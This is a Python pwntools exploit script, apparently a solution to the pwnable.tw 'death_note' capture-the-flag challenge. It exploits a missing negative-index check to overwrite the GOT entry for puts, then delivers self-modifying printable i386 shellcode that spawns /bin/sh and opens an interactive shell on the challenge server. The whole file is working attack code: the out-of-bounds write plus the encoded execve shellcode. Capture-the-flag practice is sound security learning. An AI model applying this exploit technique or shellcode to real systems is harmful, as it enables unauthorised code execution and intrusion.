#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

from pwn import *
context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

elf  = ELF('./death_note')

# Byte sequence alias
A4 = 4 * b'A'


def polymorphic_shellcode():
    """
    00000000: 6a41 582c 4150 5a6a 4158 2c36 682f 7368  jAX,APZjAX,6h/sh
    00000010: 3068 2f62 696e 545b cd80                 0h/binT[..
    """
    # \x30 -> \x00
    shellcode  = asm('push 0x30')                  # 2 bytes
    shellcode += asm('pop ebx')                    # 1 byte
    shellcode += asm('sub byte ptr [edx+40], bl')  # 3 bytes

    # \x33 -> \xcd
    shellcode += asm('push 0x33')                  # 2 bytes
    shellcode += asm('pop ebx')                    # 1 byte
    shellcode += asm('sub byte ptr [edx+48], bl')  # 3 bytes
    shellcode += asm('sub byte ptr [edx+48], bl')  # 3 bytes

    # \x34 -> \x80
    shellcode += asm('push 0x5a')                  # 2 bytes
    shellcode += asm('pop ebx')                    # 1 byte
    shellcode += asm('sub byte ptr [edx+49], bl')  # 3 bytes
    shellcode += asm('sub byte ptr [edx+49], bl')  # 3 bytes

    # 26 bytes (0x2d bytes)
    shellcode += b'\x6a\x41\x58\x2c\x41\x50\x5a\x6a\x41\x58\x2c\x36\x68\x2f\x73\x68\x30\x68\x2f\x62\x69\x6e\x54\x5b\x33\x34'
    return shellcode


def main():
    """
    In add_note(), the program does not check
    if `input` is less than 0, we we can
    try to give it a negative index and
    overwrite elf.got['puts'].
    """
    proc = remote('chall.pwnable.tw', 10201)
    #proc = elf.process()
    #log.debug('You may attatch this process to gdb now.')
    #raw_input()

    proc.sendlineafter('Your choice :', b'1')

    # Calculate index from `elf.sym['note']` to `elf.got['puts']`.
    index = (elf.got['puts'] - elf.sym['note']) // 4
    proc.sendlineafter('Index :', str(index).encode())
    log.info("the index to overwrite elf.sym['puts']: {}".format(index))

    # Prepare printable polymorphic shellcode
    shellcode = polymorphic_shellcode()
    proc.sendlineafter('Name :', shellcode)
    log.info('serving payload...: {}'.format(shellcode))

    proc.interactive()


if __name__ == '__main__':
    main()
